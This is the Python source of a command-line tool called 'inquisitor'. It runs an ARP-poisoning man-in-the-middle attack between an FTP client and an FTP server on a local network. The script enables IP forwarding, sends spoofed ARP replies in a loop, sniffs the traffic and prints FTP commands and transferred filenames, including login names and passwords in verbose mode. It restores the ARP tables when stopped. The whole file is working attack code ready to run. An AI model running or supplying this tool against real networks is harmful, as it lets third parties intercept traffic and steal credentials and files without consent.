import argparse
import ipaddress
import threading
import os
import time
from datetime import datetime
from functools import partial
from scapy.all import sniff, ARP, Ether, sendp, IP, Raw, Ether
from colorama import Fore, Style

DESCRIPTION = '''\
-----------------------------------------------------------------------------------------------------------
Discription:
 Sniffs packets between the specified FTP client (source) and FTP server (target) over TCP,
 displaying only filenames transferred via the FTP protocol.
-----------------------------------------------------------------------------------------------------------'''

EPILOG = '''\
-----------------------------------------------------------------------------------------------------------
• This program supports IPv4 addresses only.
• The attack can be terminated gracefully using SIGINT (Ctrl + C).
-----------------------------------------------------------------------------------------------------------'''

FTP_CMD = [
    "ABOR", "ACCT", "ADAT", "ALLO", "APPE", "AUTH", "AVBL", "CCC", "CCUP", "CONF", "CSID", "CWD",
    "DELE", "DSIZ", "ENC", "EPRT", "EPSV", "FEAT", "HELP" ,"HOST", "LANG", "LIST", "LPRT", "LPSV",
    "MDTM", "MFCT", "MFF", "MFMT", "MIC", "MKD", "MLSD", "MLST", "MODE", "NLST", "NOOP", "OPTS",
    "PASS", "PASV", "PBSZ", "PORT", "PROT", "PWD", "QUIT", "REIN", "RETR", "RMD", "RMDA", "RNFR",
    "RNTO", "SITE", "SMNT", "SPSV", "STAT", "STOR", "STRU", "SYST", "THMB", "TYPE", "USER", "XCUP",
    "XMKD", "XPWD", "XRCP", "XTMD", "XRSQ", "XSEM", "XSEN", "100", "110", "120", "125", "150", "200",
    "202", "211", "212", "213", "214", "215", "220", "221", "225", "226", "227", "228", "229", "230",
    "232", "234", "235", "250", "300", "331", "332", "334", "336", "421", "425", "426", "430", "431",
    "434", "450", "452", "500", "501", "502", "503", "504", "530", "532", "533", "534", "535", "536",
    "537", "550", "551", "552", "553", "600", "631", "632", "633"
    ]

stop_sniffing = threading.Event()
seen = set()

def main() -> int:
    try:
        args = arguments_parse()
        if not fomat_check(args):
            return 1
        info("Enable IP forwarding. ", end="")
        os.system("sysctl -w net.ipv4.ip_forward=1")
        stop_event = threading.Event()
        poison_thread = threading.Thread(
            args=(args.ip_src, args.mac_src, args.ip_target, args.mac_target, stop_event),
            target=arp_poison)
        poison_thread.start()
        info("Starting network capture.")
        sniff(prn=partial(packet_handler, verbose=args.verbose), iface="eth0", stop_filter=stop_handler, filter='tcp')
        clean(args.ip_src, args.mac_src, args.ip_target, args.mac_target, stop_event, poison_thread)
    except Exception as e:
        clean(args.ip_src, args.mac_src, args.ip_target, args.mac_target, stop_event, poison_thread)
        return error(f"{e}", 1)
    return 0

def arp_poison(ip_src: str, mac_src: str, ip_target: str, mac_target: str, stop_event) -> int:
    try:
        info("Started ARP poison attack. [CTRL-C to stop]")
        while not stop_event.is_set():
            sendp(Ether(dst=mac_src)/ARP(op=2, pdst=ip_src, hwdst=mac_src, psrc=ip_target),
                   verbose=0, iface="eth0")
            sendp(Ether(dst=mac_target)/ARP(op=2, pdst=ip_target, hwdst=mac_target, psrc=ip_src),
                   verbose=0, iface="eth0")
            time.sleep(2)
        info("Stopped ARP poison attack. Restoring network.")
    except KeyboardInterrupt:
        arp_restore(ip_src, mac_src, ip_target, mac_target)
    except Exception as e:
        return error(f"{e} occurred while attempting to poison ARP.", 1)
    return 0

def arp_restore(ip_src: str, mac_src: str, ip_target: str, mac_target: str) -> None:
    broadcast = "ff:ff:ff:ff:ff:ff"
    sendp(Ether(dst=broadcast)/ARP(op=2, hwdst=broadcast, pdst=ip_target, hwsrc=mac_src, psrc=ip_src),
          verbose=0, iface="eth0")
    sendp(Ether(dst=broadcast)/ARP(op=2, hwdst=broadcast, pdst=ip_src, hwsrc=mac_target, psrc=ip_target),
          verbose=0, iface="eth0")
    info("Restored ARP table.")
    info("Disable IP forwarding. ", end="")
    os.system("sudo sysctl -w net.ipv4.ip_forward=0")

def packet_handler(pk, verbose: bool) -> None:
    try:
        if Raw in pk and IP in pk:
            payload = pk[Raw].load.decode(errors="ignore").strip()
            header = str(pk[IP]).split("/")
            log = log_filename(payload, header[1].strip())
            if not log or log in seen: return
            seen.add(log)
            if not verbose and ("RETR" in payload or "STOR" in payload) or verbose:
                print(log)
                pass
    except Exception as e:
        error(f"{e} occurred while attempting to sniff.", 1)

def log_filename(payload: str, header: str) -> str:
    t = ctime(datetime.now().timestamp())
    i = header.split(' ')
    p = payload.split(' ')
    log = None
    if p[0] in FTP_CMD:
        log = f"{Fore.BLUE}[SNIFF]{Style.RESET_ALL} {t} {Fore.GREEN}[{i[0] + "]":5}{Style.RESET_ALL} {i[1]} -> {i[3]} {i[4].rjust(8)} "
        log += f"{Fore.YELLOW}{p[0].rjust(4)} : {Style.RESET_ALL} {Fore.MAGENTA}{" ".join(p[1:])}{Style.RESET_ALL}".strip()
    return log

def stop_handler(package):
    return stop_sniffing.is_set()
    
def arguments_parse() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(prog="inquisitor", formatter_class=argparse.RawDescriptionHelpFormatter,
    description=DESCRIPTION, epilog=EPILOG)
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Show all captured FTP traffic in detail.")
    parser.add_argument("ip_src", type=str, metavar="<IP-SRC>", 
                        help="IP address of the FTP client.nt.")
    parser.add_argument("mac_src", type=str, metavar="<MAC-SRC>",
                        help="MAC address of the FTP-client.")
    parser.add_argument("ip_target", type=str, metavar="<IP-TAGET>",
                        help="IP address of the FTP-server.")
    parser.add_argument("mac_target", type=str, metavar="<MAC-TAGET>",
                        help="MAC address of the FTP-server.")
    return parser.parse_args()

def fomat_check(args: argparse.ArgumentParser) -> bool:
    if args.ip_src == args.ip_target:
        return error("Same IP with src and target")
    mac_address = [args.mac_src, args.mac_target]
    ip_address = [args.ip_src, args.ip_target]
    for i in mac_address:
        splited = list(filter(lambda x: x.isalnum(), i.strip().split(':')))
        if len(splited) != 6:
            return error("Invalid mac addresss fomat.", False)
    for i in ip_address:
        splited = list(filter(lambda x: x.isdigit(), i.strip().split('.')))
        if len(splited) != 4:
            return error("Invalid ip addresss fomat.", False)
    return True

def clean(ip_src: str, mac_src: str, ip_target: str, mac_target: str, stop_event, poison_thread) -> None:
    stop_event.set()
    arp_restore(ip_src, mac_src, ip_target, mac_target)
    poison_thread.join()

def ctime(timestamp: int) -> str:
    dt = datetime.fromtimestamp(timestamp)
    return str(dt).split('.')[0]

def info(message: str, end='\n'):
    return print(f"{Fore.YELLOW}[INFO-]{Style.RESET_ALL} {message}", end=end, flush=True)

def error(message: str, code: int=None) -> int:
    print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} {message}")
    return code

if __name__ == "__main__":
    main()
